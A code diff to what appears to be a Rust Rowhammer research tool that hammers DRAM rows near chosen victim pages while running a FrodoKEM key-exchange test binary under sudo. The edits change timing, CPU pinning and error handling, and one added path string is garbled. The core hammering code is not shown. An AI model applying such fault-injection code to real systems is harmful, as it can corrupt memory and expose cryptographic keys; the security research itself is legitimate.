@@ -19,12 +19,12 @@ use procfs::process::Process;
 use crate::profiler::{
     pagefinder::{get_candidate_pages, PageCandidate},
     utils::{
-        self, collect_pages_by_row, fill_memory, get_block_by_order, get_page_frame_number,
-        rowhammer, setup_mapping, count_flips_by_bit,
+        self, collect_pages_by_row, count_flips_by_bit, fill_memory, get_block_by_order,
+        get_page_frame_number, rowhammer, setup_mapping,
     },
 };
 
-const TEST_ITERATIONS: u32 = 10;
+//const TEST_ITERATIONS: u32 = 10;
 const INIT_PATTERN: u16 = 0x0;
 
 fn get_page_pfns(input_path: impl AsRef<Path>) -> Result<(u64, (u64, u64), (u64, u64)), String> {
@@ -84,7 +84,7 @@ fn sanity_check_attack(pages: Vec<PageCandidate>) {
         }
 
         // Check if we've been running for set amount of time
-        if start.elapsed().as_secs() >= 10 {
+        if start.elapsed().as_secs() >= 5 {
             break;
         }
     }
@@ -135,13 +135,19 @@ fn rowhammer_attack(pages: Vec<PageCandidate>, number_of_dummy_pages: usize) {
     let mut dummy_pages = Vec::with_capacity(2 * number_of_dummy_pages);
     for i in 0.. {
         let virtual_addr = unsafe { block_mapping.as_mut_ptr().add(i * utils::PAGE_SIZE) };
-        let pfn = get_page_frame_number(pagemap, virtual_addr)
-            .expect("Couldn't get pfn of allocated page");
-        if pfn <= 0x100000 {
-            dummy_pages.push((virtual_addr, pfn));
-        }
-        if dummy_pages.len() >= 2 * number_of_dummy_pages {
-            break;
+
+        match get_page_frame_number(pagemap, virtual_addr) {
+            Ok(pfn) => {
+                if pfn <= 0x100000 {
+                    dummy_pages.push((virtual_addr, pfn));
+                }
+                if dummy_pages.len() >= 2 * number_of_dummy_pages {
+                    break;
+                }
+            }
+            Err(_) => {
+                continue;
+            }
         }
     }
 
@@ -195,7 +201,12 @@ fn rowhammer_attack(pages: Vec<PageCandidate>, number_of_dummy_pages: usize) {
             }
 
             let ok = Command::new("sudo")
-                .arg("/home/development/Frodo/PQCrypto-LWEKE/frodo640/test_KEM > vic.out")
+                .arg("taskset")
+                .arg("0x2")
+                .arg(
+                    "/home/development/Frodo/PQCrypto-LWElsls
+                sadKE/frodo640/test_KEM",
+                )
                 .status()
                 .expect("failed to execute command");
 
@@ -217,6 +228,15 @@ fn rowhammer_attack(pages: Vec<PageCandidate>, number_of_dummy_pages: usize) {
                 .arg("degrade")
                 .status()
                 .expect("failed to kill degradations");
+
+            //for page in &pages {
+            //    let (flips, flip_offsets) = count_flips_by_bit(&page.target_page, INIT_PATTERN);
+
+            //    println!(
+            //        "Page {:#x} had {:?} flips.\nWith offsets: {:?}",
+            //        page.target_page.pfn, flips, flip_offsets,
+            //    );
+            //}
         }
 
         Ok(ForkResult::Child) => {
@@ -224,7 +244,7 @@ fn rowhammer_attack(pages: Vec<PageCandidate>, number_of_dummy_pages: usize) {
 
             // Setting Cpu affinity to core 1
             let mut cpu_set = CpuSet::new();
-            cpu_set.set(5).unwrap();
+            cpu_set.set(2).unwrap();
             sched_setaffinity(Pid::from_raw(0), &cpu_set).unwrap();
 
             // Set values to allocated memory before attacking
@@ -282,7 +302,7 @@ pub(crate) fn main(
     }
 
     let victim_pfns = [0x3b4bf1, 0x3dd31e, 0x400b3a];
-
+    //let victim_pfns = [0x3b4bf1];
     let mut victim_pages = Vec::new();
 
     for pfn in &victim_pfns {
@@ -338,6 +358,13 @@ pub(crate) fn main(
                 continue 'main;
             }
         }
+    }
+
+    for page in &victims {
+        println!(
+            "Page:{:#x?}, Address:{:?}\n",
+            page.target_page.pfn, page.target_page.virt_addr
+        )
     }
 
     if hammer {
